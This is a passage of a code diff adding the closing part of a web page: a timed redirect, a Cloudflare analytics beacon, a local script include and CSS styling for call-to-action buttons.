+        window.location.href = targetUrl;
+      }, 1500);
+    }
+  </script>
+
+
+  <script defer="" src="beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516-6"
+    integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg=="
+    data-cf-beacon='{"version":"2024.11.0","token":"291788ee003a413395b0add202b81cef","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+    crossorigin="anonymous"></script>
+  <script src="js/front-boost.js?v=2" defer></script>
+<style id="brandCTA">
+.btn-primary,.btn-submit,.cta-button{background:linear-gradient(135deg, #1b4cff, #0a66d9) !important;box-shadow:0 16px 30px -12px rgb(15 95 240 / 50%), inset 0 1px 0 rgba(255, 255, 255, .3) !important;color:#fff!important;border:none!important}
+</style>
+
+</body>
+
+</html>
